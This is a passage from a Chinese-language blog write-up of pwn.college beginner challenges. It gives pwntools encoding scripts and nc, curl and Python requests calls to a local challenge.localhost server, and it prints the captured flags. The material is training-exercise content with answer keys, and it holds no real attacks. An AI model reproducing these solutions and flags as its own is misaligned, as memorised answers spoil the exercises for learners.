<h4 id="12-Nested-Encoding"><a href="#12-Nested-Encoding" class="headerlink" title="12. Nested Encoding"></a>12. Nested Encoding</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>correct_password = <span class="hljs-string">b&quot;arumrhnj&quot;</span><br>correct_password = enhex(correct_password)<br>correct_password = correct_password.encode(<span class="hljs-string">&quot;l1&quot;</span>)<br>correct_password = enhex(correct_password)<br>correct_password = correct_password.encode(<span class="hljs-string">&quot;l1&quot;</span>)<br>correct_password = enhex(correct_password)<br>correct_password = correct_password.encode(<span class="hljs-string">&quot;l1&quot;</span>)<br>correct_password = enhex(correct_password)<br>correct_password = correct_password.encode(<span class="hljs-string">&quot;l1&quot;</span>)<br><span class="hljs-built_in">print</span>(correct_password)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>

<h4 id="13-Hex-encoding-UTF-8"><a href="#13-Hex-encoding-UTF-8" class="headerlink" title="13. Hex-encoding UTF-8"></a>13. Hex-encoding UTF-8</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>correct_password = <span class="hljs-string">&quot;📐 🌍 🍗 🔵&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>correct_password = enhex(correct_password)<br><span class="hljs-built_in">print</span>(correct_password)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>

<h4 id="14-UTF-Mixups"><a href="#14-UTF-Mixups" class="headerlink" title="14. UTF Mixups"></a>14. UTF Mixups</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;amoozuff&quot;</span><br>correct_password = correct_password.decode(<span class="hljs-string">&quot;latin1&quot;</span>)<br>correct_password = correct_password.encode(<span class="hljs-string">&quot;utf-16&quot;</span>)<br><span class="hljs-built_in">print</span>(correct_password)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;okeu&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(correct_password)<br></code></pre></td></tr></table></figure>

<h4 id="15-Modifying-Encoded-Data"><a href="#15-Modifying-Encoded-Data" class="headerlink" title="15. Modifying Encoded Data"></a>15. Modifying Encoded Data</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;\xf1~\xe6P\xc0\x9a\x1f\xa6&quot;</span><br>correct_password = enhex(correct_password)<br>correct_password = correct_password[::-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(correct_password)<br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>

<h4 id="16-Decoding-Base64"><a href="#16-Decoding-Base64" class="headerlink" title="16. Decoding Base64"></a>16. Decoding Base64</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;iAb/uzx0uJQ=&quot;</span><br>correct_password = b64d(correct_password)<br><span class="hljs-built_in">print</span>(correct_password)<br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br><br></code></pre></td></tr></table></figure>

<h4 id="17-Encoding-Base64"><a href="#17-Encoding-Base64" class="headerlink" title="17. Encoding Base64"></a>17. Encoding Base64</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;\\\x0fz\xf4\xe27\xe4\xf3&quot;</span><br>correct_password = b64e(correct_password)<br><span class="hljs-built_in">print</span>(correct_password)<br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>

<h4 id="18-Dealing-with-Obfuscation"><a href="#18-Dealing-with-Obfuscation" class="headerlink" title="18. Dealing with Obfuscation"></a>18. Dealing with Obfuscation</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>correct_password = <span class="hljs-string">b&quot;\x9c\xebn\xb4\xd1\xe5r\x05&quot;</span><br>correct_password = correct_password.<span class="hljs-built_in">hex</span>().encode(<span class="hljs-string">&quot;l1&quot;</span>)<br>correct_password = base64.b64encode(correct_password)<br>correct_password = correct_password[::-<span class="hljs-number">1</span>]<br>correct_password = correct_password.<span class="hljs-built_in">hex</span>().encode(<span class="hljs-string">&quot;l1&quot;</span>)<br><span class="hljs-built_in">print</span>(correct_password)<br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>

<h4 id="19-Dealing-with-Obfuscation-2"><a href="#19-Dealing-with-Obfuscation-2" class="headerlink" title="19. Dealing with Obfuscation 2"></a>19. Dealing with Obfuscation 2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_to_bits</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">format</span>(c, <span class="hljs-string">&quot;08b&quot;</span>).encode(<span class="hljs-string">&quot;latin1&quot;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s)<br><br>correct_password = <span class="hljs-string">b&quot;V\x04\x93\x98\x05\xd4^\r&quot;</span><br>correct_password = encode_to_bits(correct_password)<br>correct_password = base64.b64encode(correct_password)<br>correct_password = b64e(correct_password)<br>correct_password = correct_password[::-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(correct_password)<br><br>correct_password = b64e(correct_password.encode(<span class="hljs-string">&quot;l1&quot;</span>))<br>correct_password = correct_password[::-<span class="hljs-number">1</span>]<br>correct_password = correct_password[::-<span class="hljs-number">1</span>]<br>correct_password = b64e(correct_password.encode(<span class="hljs-string">&#x27;l1&#x27;</span>))<br><br>p = process(<span class="hljs-string">&#x27;/challenge/runme&#x27;</span>)<br>p.write(correct_password)<br><span class="hljs-built_in">print</span>(p.readall())<br></code></pre></td></tr></table></figure>



<h3 id="Talking-Web"><a href="#Talking-Web" class="headerlink" title="Talking Web"></a>Talking Web</h3><h4 id="1-Your-First-HTTP-Request"><a href="#1-Your-First-HTTP-Request" class="headerlink" title="1. Your First HTTP Request"></a>1. Your First HTTP Request</h4><p>用GUI打开，然后命令行运行<code>/challenge/server</code>，最后浏览器打开网页，即可获得flag</p>
<h4 id="2-Reading-Flask"><a href="#2-Reading-Flask" class="headerlink" title="2. Reading Flask"></a>2. Reading Flask</h4><p>访问<code>http://challenge.localhost/access</code></p>
<h4 id="3-Commented-Data"><a href="#3-Commented-Data" class="headerlink" title="3. Commented Data"></a>3. Commented Data</h4><p>查看源码，发现在注释中存在flag。随后，F12查看页面源码就行了。</p>
<h4 id="4-HTTP-MetaData"><a href="#4-HTTP-MetaData" class="headerlink" title="4. HTTP MetaData"></a>4. HTTP MetaData</h4><p>查看源码，路径为<code>/fulfill</code>，F12打开开发者模式，然后在Network中，找到fulfill这一项，点击后在右边找到Header，其中X-FLAG字段就是flag</p>
<h4 id="5-HTTP-netcat"><a href="#5-HTTP-netcat" class="headerlink" title="5. HTTP (netcat)"></a>5. HTTP (netcat)</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@talking-web~http-netcat:~/Desktop$ nc challenge.localhost <span class="hljs-number">80</span><br><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span>: Werkzeug/<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span> Python/<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">10</span><br><span class="hljs-attribute">Date</span>: Sun, <span class="hljs-number">02</span> Mar <span class="hljs-number">2025</span> <span class="hljs-number">12</span>:<span class="hljs-number">59</span>:<span class="hljs-number">11</span> GMT<br><span class="hljs-attribute">Content</span>-Type: text/html; charset=utf-<span class="hljs-number">8</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">84</span><br><span class="hljs-attribute">X</span>-Flag: pwn.college&#123;YrqEpNPZzcBDnBQkJiogkaSfKN0.dljNyMDLxYTN1YzW&#125;<br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-section">&lt;html&gt;</span><span class="hljs-section">&lt;head&gt;</span><span class="hljs-section">&lt;title&gt;</span><span class="hljs-attribute">Talking</span> Web&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Great job!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>思路就是，使用nc命令，获取网页信息。并且使用GET请求，随后接收到响应。响应中存在flag。</p>
<blockquote>
<p>记住，输入两次回车，才是结束本次请求。</p>
</blockquote>
<h4 id="6-HTTP-Paths-netcat"><a href="#6-HTTP-Paths-netcat" class="headerlink" title="6. HTTP Paths (netcat)"></a>6. HTTP Paths (netcat)</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hacker</span>@talking-web~http-paths-netcat:~/Desktop$ nc challenge.localhost <span class="hljs-number">80</span><br><span class="hljs-attribute">GET</span> /hack HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span>: Werkzeug/<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span> Python/<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">10</span><br><span class="hljs-attribute">Date</span>: Sun, <span class="hljs-number">02</span> Mar <span class="hljs-number">2025</span> <span class="hljs-number">13</span>:<span class="hljs-number">04</span>:<span class="hljs-number">48</span> GMT<br><span class="hljs-attribute">Content</span>-Type: text/html; charset=utf-<span class="hljs-number">8</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">243</span><br><span class="hljs-attribute">Connection</span>: close<br><br><br>        <span class="hljs-section">&lt;html&gt;</span><br>          <span class="hljs-section">&lt;head&gt;</span><span class="hljs-section">&lt;title&gt;</span><span class="hljs-attribute">Talking</span> Web&lt;/title&gt;&lt;/head&gt;<br>        <span class="hljs-section">&lt;body&gt;</span><br>          <span class="hljs-section">&lt;h1&gt;</span><span class="hljs-attribute">Great</span> job!&lt;/h1&gt;<br>          <span class="hljs-section">&lt;!-- TOP SECRET: &lt;p&gt;</span><span class="hljs-attribute">pwn</span>.college&#123;s97BHDSXwCrre5GEUP0gFK5CKc_.dVzNyMDLxYTN1YzW&#125;&lt;/p&gt; --&gt;<br>        <span class="hljs-section">&lt;/body&gt;</span><br>        <span class="hljs-section">&lt;/html&gt;</span><br>    <br></code></pre></td></tr></table></figure>

<p>多了一个路径而已。</p>
<h4 id="7-HTTP-curl"><a href="#7-HTTP-curl" class="headerlink" title="7. HTTP (curl)"></a>7. HTTP (curl)</h4><p><code>curl</code>是一个强大的命令行工具，用于与服务器进行数据传输。它支持多种协议。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl [选项] [URL]<br></code></pre></td></tr></table></figure>

<p><strong>常用选项</strong></p>
<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-X</code> 或 <code>--request</code></td>
<td align="left">指定 HTTP 请求方法（如 GET、POST、PUT、DELETE）。</td>
</tr>
<tr>
<td align="left"><code>-H</code> 或 <code>--header</code></td>
<td align="left">添加 HTTP 请求头。</td>
</tr>
<tr>
<td align="left"><code>-d</code> 或 <code>--data</code></td>
<td align="left">发送 POST 请求的数据（表单数据）。</td>
</tr>
<tr>
<td align="left"><code>-F</code> 或 <code>--form</code></td>
<td align="left">发送文件或表单数据（用于文件上传）。</td>
</tr>
<tr>
<td align="left"><code>-o</code> 或 <code>--output</code></td>
<td align="left">将输出保存到文件。</td>
</tr>
<tr>
<td align="left"><code>-O</code></td>
<td align="left">将输出保存为文件名（从 URL 中提取文件名）。</td>
</tr>
<tr>
<td align="left"><code>-i</code> 或 <code>--include</code></td>
<td align="left">显示响应头信息。</td>
</tr>
<tr>
<td align="left"><code>-I</code> 或 <code>--head</code></td>
<td align="left">仅显示响应头信息（HEAD 请求）。</td>
</tr>
<tr>
<td align="left"><code>-u</code> 或 <code>--user</code></td>
<td align="left">指定用户名和密码（用于认证）。</td>
</tr>
<tr>
<td align="left"><code>-v</code> 或 <code>--verbose</code></td>
<td align="left">显示详细请求和响应信息。</td>
</tr>
<tr>
<td align="left"><code>-L</code> 或 <code>--location</code></td>
<td align="left">自动跟随重定向。</td>
</tr>
<tr>
<td align="left"><code>-k</code> 或 <code>--insecure</code></td>
<td align="left">忽略 SSL 证书验证。</td>
</tr>
<tr>
<td align="left"><code>-s</code> 或 <code>--silent</code></td>
<td align="left">静默模式，不显示进度和错误信息。</td>
</tr>
<tr>
<td align="left"><code>-A</code> 或 <code>--user-agent</code></td>
<td align="left">设置 User-Agent 请求头。</td>
</tr>
</tbody></table>
<p>这题很简单了，直接curl就好了。</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">hacker@talking-web~http-curl:~/Desktop$ curl challenge</span><br><span class="language-xml">.localhost/pwn</span><br><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Talking Web<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Great job!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>pwn.college</span><span class="hljs-template-variable">&#123;UNlBBwS-NwpLJYdlVPpEoojvICd.dRzNyMDLxYTN1YzW&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<h4 id="8-HTTP-python"><a href="#8-HTTP-python" class="headerlink" title="8. HTTP (python)"></a>8. HTTP (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/verify&quot;</span><br><br>response = requests.get(url)<br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure>

<p>用python的requests模块，写个get请求即可。</p>
<h4 id="9-HTTP-Host-Header-python"><a href="#9-HTTP-Host-Header-python" class="headerlink" title="9. HTTP Host Header (python)"></a>9. HTTP Host Header (python)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/submission&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;ctflearn.com:80&quot;</span><br>&#125;<br>response = requests.get(url, headers=headers)<br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure>

<h4 id="10-HTTP-Host-Header-curl"><a href="#10-HTTP-Host-Header-curl" class="headerlink" title="10. HTTP Host Header (curl)"></a>10. HTTP Host Header (curl)</h4><p>查一查curl的用法即可。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;Host: overthewire.org:80&quot;</span> challenge.localhost/progress<br></code></pre></td></tr></table></figure>

<h4 id="11-HTTP-Host-Header-netcat"><a href="#11-HTTP-Host-Header-netcat" class="headerlink" title="11. HTTP Host Header (netcat)"></a>11. HTTP Host Header (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-host-header-netcat:~/Desktop$ nc -v challenge.localhost  80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>GET /hack HTTP/1.1<br>Host: gandalf.lakera.ai:80<br><br>HTTP/1.1 200 OK<br>Server: Werkzeug/3.0.6 Python/3.8.10<br>Date: Sun, 02 Mar 2025 13:36:13 GMT<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 222<br>Connection: close<br><br><br>        &lt;html&gt;<br>          &lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;Talking Web&lt;/title&gt;&lt;/head&gt;<br>        &lt;body&gt;<br>          &lt;h1&gt;Great job!&lt;/h1&gt;<br>          &lt;p&gt;pwn.college&#123;IpeiHFr8AbndI-uKFGS8WxMBKHR.dJzNyMDLxYTN1YzW&#125;&lt;/p&gt;<br>        &lt;/body&gt;<br>        &lt;/html&gt;<br></code></pre></td></tr></table></figure>

<h4 id="12-URL-Encoding-netcat"><a href="#12-URL-Encoding-netcat" class="headerlink" title="12. URL Encoding (netcat)"></a>12. URL Encoding (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~url-encoding-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>GET /entry%20mission%20verify HTTP/1.1<br>Host: challenge.localhost:80<br><br>HTTP/1.1 200 OK<br>Server: Werkzeug/3.0.6 Python/3.8.10<br>Date: Sun, 02 Mar 2025 13:42:45 GMT<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 222<br>Connection: close<br><br><br>        &lt;html&gt;<br>          &lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;Talking Web&lt;/title&gt;&lt;/head&gt;<br>        &lt;body&gt;<br>          &lt;h1&gt;Great job!&lt;/h1&gt;<br>          &lt;p&gt;pwn.college&#123;gJwS5WKPnVX7YX3P2lEwKq0xpc3.dlzNyMDLxYTN1YzW&#125;&lt;/p&gt;<br>        &lt;/body&gt;<br>        &lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>编码，空格在url编码中是<code>%20</code>，因此，在nc命令中使用<code>%20</code>代替即可。</p>
<h4 id="13-HTTP-GET-Parameters"><a href="#13-HTTP-GET-Parameters" class="headerlink" title="13. HTTP GET Parameters"></a>13. HTTP GET Parameters</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/submit&quot;</span><br>params = &#123;<br>    <span class="hljs-string">&quot;unlock&quot;</span>: <span class="hljs-string">&quot;ufxxiiik&quot;</span><br>&#125;<br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;challenge.localhost:80&quot;</span><br>&#125;<br>response = requests.get(url, headers=headers, params=params)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure>

<p>加GET请求的参数。</p>
<h4 id="14-Multiple-HTTP-parameters-netcat"><a href="#14-Multiple-HTTP-parameters-netcat" class="headerlink" title="14. Multiple HTTP parameters (netcat)"></a>14. Multiple HTTP parameters (netcat)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~multiple-http-parameters-netcat:~/Desktop$ nc -v challenge.localhost 80<br>Connection to challenge.localhost (127.0.0.1) 80 port [tcp/http] succeeded!<br>GET /pass?security=kifydwjj&amp;auth_key=mbdncplm&amp;keycode=zuqfwurr HTTP/1.1<br>Host: challenge.localhost:80<br></code></pre></td></tr></table></figure>

<p>用nc命令，构造一个GET请求即可。</p>
<h4 id="15-Multiple-HTTP-parameters-curl"><a href="#15-Multiple-HTTP-parameters-curl" class="headerlink" title="15. Multiple HTTP parameters(curl)"></a>15. Multiple HTTP parameters(curl)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~multiple-http-parameters-curl:~/Desktop$ curl -H <span class="hljs-string">&quot;Host: challenge.localhost:80&quot;</span>  <span class="hljs-string">&quot;http://challenge.localhost/authenticate?hash=jzsfndeg&amp;auth_pass=erdsycur&amp;access_code=sxobnyrn&quot;</span><br></code></pre></td></tr></table></figure>

<p>用双引号包括域名，使得<code>&amp;</code>被用作参数连接符。</p>
<h4 id="16-HTTP-Forms"><a href="#16-HTTP-Forms" class="headerlink" title="16. HTTP Forms"></a>16. HTTP Forms</h4><p>这关本来是直接打开浏览器访问提交表单就能拿到flag，但是那个太卡了，所以这里也用的python来发送Post请求。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.localhost/request&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;verify&quot;</span>: <span class="hljs-string">&quot;mbobcxum&quot;</span><br>&#125;<br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;challenge.localhost:80&quot;</span>,<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Firefox&quot;</span><br>&#125;<br><br>response = requests.post(url, headers=headers, data=data)<br><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<p>这里需要加<code>User-Agent</code>字段，是因为题目会检测是否采用的是Firefox打开。</p>
<h4 id="17-HTTP-Forms-curl"><a href="#17-HTTP-Forms-curl" class="headerlink" title="17. HTTP Forms (curl)"></a>17. HTTP Forms (curl)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@talking-web~http-forms-curl:~/Desktop$ curl -X POST -d <span class="hljs-string">&quot;keycode=xqwrvyfd&quot;</span> -H <span class="hljs-string">&quot;Host: challenge.localhost:80&quot;</span> http://challenge.localhost/meet<br></code></pre></td></tr></table></figure>

